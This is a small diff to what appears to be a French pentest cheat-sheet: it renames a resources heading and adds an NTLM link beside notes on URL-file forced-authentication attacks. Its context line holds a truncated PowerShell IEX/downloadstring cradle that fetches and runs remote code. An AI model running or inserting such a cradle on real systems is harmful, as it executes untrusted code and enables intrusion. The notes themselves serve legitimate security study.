@@ -11,7 +11,7 @@ IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/
 ---
 ### DIVERS
 ---
-**Ressources :**
+**Global Ressources :**
 - https://viperone.gitbook.io/pentest-everything
 - https://book.hacktricks.xyz/
 - https://atomicredteam.io/atomics/
@@ -29,6 +29,9 @@ C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Recent
 **Url file attack**
 - https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication
 - https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/forced-coercion/url-file-attack
+
+**NTLM**
+- https://www.scip.ch/en/?labs.20210909
 
 <br/><br/>
 
